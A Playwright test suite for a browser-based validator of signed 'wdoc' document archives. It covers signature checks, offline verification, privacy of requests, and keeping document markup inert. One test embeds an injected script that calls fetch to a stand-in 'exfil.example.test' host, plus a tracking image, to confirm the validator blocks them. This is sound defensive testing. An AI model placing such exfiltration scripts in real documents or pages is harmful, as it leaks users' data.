import { test, expect, type Page } from '@playwright/test';
import { readFile } from 'node:fs/promises';
import { CompactSign, exportJWK, generateKeyPair } from 'jose';
import JSZip from 'jszip';
import { commitment, documentDigest, encoder, inventory, jcs, newNonce, type Manifest } from '../src/app/format/core';
const registry = JSON.parse(await readFile(new URL('../../spec/vectors/registry.json', import.meta.url), 'utf8'));
const vectors = JSON.parse(await readFile(new URL('../../spec/vectors/positive.json', import.meta.url), 'utf8')).cases;
const endpoint = 'https://backend.wdoc.info/signing-keys';
const zipBuffer = async (entries: Record<string, string>) => {
    const zip = new JSZip();
    for (const [path, text] of Object.entries(entries))
        zip.file(path, text, { createFolders: false });
    return zip.generateAsync({ type: 'nodebuffer' });
};
async function choose(page: Page, buffer: Buffer, name = 'document.wdoc') { await page.getByLabel('Choose document', { exact: true }).setInputFiles({ name, mimeType: 'application/zip', buffer }); }
async function localRegistry(page: Page) {
    await page.getByRole('button', { name: 'Local registry', exact: true }).click();
    await page.getByLabel('Choose public key registry').setInputFiles({ name: 'trusted-keys.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(registry)) });
    await expect(page.getByText('2 public keys loaded')).toBeVisible();
}
async function vectorBuffer(id: string, prefix = '') {
    const vector = vectors.find((v: any) => v.id === id), zip = new JSZip();
    for (const [path, data] of Object.entries(vector.files))
        zip.file(prefix + path, Buffer.from(data as string, 'base64'), { createFolders: false });
    return zip.generateAsync({ type: 'nodebuffer' });
}
async function signedFixture() {
    const files = { 'index.html': encoder.encode('<!doctype html><html><head><meta charset="utf-8"><title>Private title</title></head><body><p>CONFIDENTIAL DOCUMENT CONTENT</p></body></html>') };
    const manifest: Manifest = { manifestVersion: '0.1', meta: { docId: crypto.randomUUID(), appVersion: 'test', createdAt: new Date().toISOString(), contentUpdatedAt: new Date().toISOString() }, content: { hashAlgorithm: 'SHA-256', files: await inventory(files) }, runtime: { submissions: {}, revisions: [] }, signatures: { document: [], forms: [] } };
    const pair = await generateKeyPair('ES256', { extractable: true }), kid = 'https://sig.wdoc.info/info/browser-test', nonce = newNonce();
    const payload = { type: 'wdoc-document-signature', proofMode: 'digest-only', documentCommitment: await commitment('document', await documentDigest(manifest), nonce), signer: { userId: 'alice', displayName: 'alice@example.test' }, signedAt: new Date().toISOString(), evidence: { scope: 'commitment-only', method: 'authenticated-session', consent: 'wdoc-sign-v1' } };
    const jws = await new CompactSign(encoder.encode(jcs(payload))).setProtectedHeader({ alg: 'ES256', typ: 'wdoc-document+jws', kid }).sign(pair.privateKey);
    manifest.signatures.document.push({ signatureId: 'signature', jws, nonce });
    const zip = new JSZip();
    zip.file('index.html', files['index.html']);
    zip.file('manifest.json', jcs(manifest));
    return { buffer: await zip.generateAsync({ type: 'nodebuffer' }), registry: { keys: [{ kid, jwk: await exportJWK(pair.publicKey), status: 'active', trusted: true, authority: 'platform', owner: 'Browser test' }] }, manifest };
}
test('a minimal document is valid, private, and offers optional improvements and a local report', async ({ page }, testInfo) => {
    const remote: string[] = [];
    page.on('request', r => { if (!r.url().startsWith('http://127.0.0.1:4300/'))
        remote.push(r.url()); });
    await page.goto('/');
    await page.screenshot({ path: testInfo.outputPath('validator-empty.png'), fullPage: true });
    await choose(page, await zipBuffer({ 'index.html': '<p>A local document</p>' }));
    await expect(page.getByRole('heading', { name: 'Valid, unsigned wdoc.', exact: true })).toBeVisible();
    await expect(page.getByRole('heading', { name: 'Add an integrity manifest' })).toBeVisible();
    await expect(page.getByRole('heading', { name: 'Sign the original document', exact: true })).toBeVisible();
    expect(remote).toEqual([]);
    await page.screenshot({ path: testInfo.outputPath('validator-unsigned.png'), fullPage: true });
    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Save JSON report' }).click();
    const file = await download, path = await file.path(), report = JSON.parse(await readFile(path!, 'utf8'));
    expect(report.format).toBe('valid');
    expect(report.documentDigest).toBeNull();
    expect(report.signatures.state).toBe('unsigned');
    expect(JSON.stringify(report)).not.toContain('A local document');
    await page.getByRole('button', { name: 'Clear document' }).click();
    await expect(page.getByRole('heading', { name: 'A clear picture of your document.' })).toBeVisible();
});
test('drag and drop resolves one wrapper and rejects multiple root folders', async ({ page }) => {
    await page.goto('/');
    const bytes = Array.from(await zipBuffer({ 'Report/index.html': '<p>Wrapped</p>' }));
    const data = await page.evaluateHandle(bytes => { const transfer = new DataTransfer(); transfer.items.add(new File([new Uint8Array(bytes)], 'wrapped.wdoc', { type: 'application/zip' })); return transfer; }, bytes);
    const target = page.locator('.upload-card');
    await target.dispatchEvent('dragenter', { dataTransfer: data });
    await expect(target).toHaveClass(/is-dragging/);
    await target.dispatchEvent('drop', { dataTransfer: data });
    await expect(page.getByRole('heading', { name: 'Valid, unsigned wdoc.', exact: true })).toBeVisible();
    await page.getByText('Inspected files', { exact: false }).click();
    await expect(page.locator('.inventory-root')).toContainText('Report/');
    await choose(page, await zipBuffer({ 'One/index.html': 'One', 'Two/index.html': 'Two' }), 'ambiguous.wdoc');
    await expect(page.getByRole('heading', { name: 'This file does not conform.' })).toBeVisible();
    await expect(page.getByRole('heading', { name: 'Archive or entry point is invalid' })).toBeVisible();
});
test('verifies original, form, and seal using a trusted local registry while offline', async ({ page }, testInfo) => {
    const outbound: string[] = [];
    await page.route('https://**/*', route => { outbound.push(route.request().url()); return route.abort(); });
    await page.goto('/');
    await localRegistry(page);
    await choose(page, await vectorBuffer('sealed', 'Exchanged report/'), 'signed.wdoc');
    await expect(page.getByRole('heading', { name: 'Format and signatures verified.' })).toBeVisible();
    await expect(page.getByText('Verified · trusted key', { exact: true })).toHaveCount(3);
    expect(outbound).toEqual([]);
    await page.screenshot({ path: testInfo.outputPath('validator-signed.png'), fullPage: true });
    const zip = await JSZip.loadAsync(await vectorBuffer('sealed'));
    zip.file('index.html', '<p>Changed original</p>');
    await choose(page, await zip.generateAsync({ type: 'nodebuffer' }), 'modified.wdoc');
    await expect(page.getByRole('heading', { name: 'This file does not conform.' })).toBeVisible();
    await expect(page.getByRole('heading', { name: 'Original bytes do not match their hash' })).toBeVisible();
});
test('uses only a public GET for online verification and never sends document data', async ({ page }) => {
    const fixture = await signedFixture(), requests: Array<{
        url: string;
        method: string;
        body: string | null;
    }> = [];
    await page.route(endpoint, route => { requests.push({ url: route.request().url(), method: route.request().method(), body: route.request().postData() }); return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify(fixture.registry) }); });
    await page.goto('/');
    await choose(page, fixture.buffer, 'private-name.wdoc');
    await expect(page.getByRole('heading', { name: 'Format and signatures verified.' })).toBeVisible();
    expect(requests).toEqual([{ url: endpoint, method: 'GET', body: null }]);
    for (const marker of ['CONFIDENTIAL', 'private-name', fixture.manifest.meta.docId, 'index.html'])
        expect(JSON.stringify(requests)).not.toContain(marker);
});
test('unavailable keys stay unverified, and a local registry rechecks the same document', async ({ page }) => {
    await page.route(endpoint, route => route.abort());
    await page.goto('/');
    await choose(page, await vectorBuffer('sealed'));
    await expect(page.getByRole('heading', { name: 'Valid format. Verification incomplete.' })).toBeVisible();
    await expect(page.getByText('Public key unavailable', { exact: true })).toHaveCount(3);
    await localRegistry(page);
    await expect(page.getByRole('heading', { name: 'Format and signatures verified.' })).toBeVisible();
    await page.getByLabel('Choose public key registry').setInputFiles({ name: 'invalid-keys.json', mimeType: 'application/json', buffer: Buffer.from('{"keys":[]}') });
    await expect(page.getByRole('alert')).toContainText('allowedOrigins');
    await expect(page.getByRole('heading', { name: 'Valid format. Verification incomplete.' })).toBeVisible();
});
test('a newer document cannot receive a delayed verification result from an older document', async ({ page }) => {
    const fixture = await signedFixture();
    let requested = false;
    await page.route(endpoint, async (route) => { requested = true; await new Promise(resolve => setTimeout(resolve, 350)); await route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify(fixture.registry) }).catch(() => { }); });
    await page.goto('/');
    await choose(page, fixture.buffer, 'old.wdoc');
    await expect.poll(() => requested).toBe(true);
    await choose(page, await zipBuffer({ 'index.html': '<p>New current document</p>' }), 'current.wdoc');
    await expect(page.getByRole('heading', { name: 'Valid, unsigned wdoc.', exact: true })).toBeVisible();
    await expect(page.locator('.selected-file')).toContainText('current.wdoc');
    await page.waitForTimeout(450);
    await expect(page.getByRole('heading', { name: 'Valid, unsigned wdoc.', exact: true })).toBeVisible();
});
test('document markup remains inert and mobile reports fit the viewport', async ({ page }, testInfo) => {
    await page.setViewportSize({ width: 390, height: 844 });
    const requests: string[] = [];
    page.on('request', request => { if (!request.url().startsWith('http://127.0.0.1:4300/'))
        requests.push(request.url()); });
    await page.goto('/');
    await choose(page, await zipBuffer({ 'index.html': '<script>window.DOCUMENT_EXECUTED=true;fetch("https://exfil.example.test/")</script><img src="https://tracking.example.test/image.png"><p>Untrusted text</p>' }), 'inert.wdoc');
    await expect(page.getByRole('heading', { name: 'Valid, unsigned wdoc.', exact: true })).toBeVisible();
    expect(await page.evaluate(() => 'DOCUMENT_EXECUTED' in window)).toBe(false);
    expect(requests).toEqual([]);
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
    await page.screenshot({ path: testInfo.outputPath('validator-mobile.png'), fullPage: true });
});
